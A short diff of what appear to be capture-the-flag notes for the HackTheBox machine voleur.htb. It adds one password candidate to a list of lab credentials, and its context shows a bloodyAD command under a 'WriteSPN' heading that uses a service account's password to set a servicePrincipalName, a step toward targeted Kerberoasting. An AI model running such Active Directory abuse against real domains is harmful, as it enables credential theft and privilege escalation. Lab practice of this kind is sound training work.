@@ -70,6 +70,7 @@ admin
 1ByF2E0ecmUnZkX2rMz1GDnct_ObYdNO
 
 Silvercore_21
+Silvercore_21!
 -------------------------------------------------------------------------------------------------------------------------------------------------
 # WriteSPN
     bloodyAD -d voleur.htb --host dc.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k set object svc_winrm servicePrincipalName -v 'http/anything'
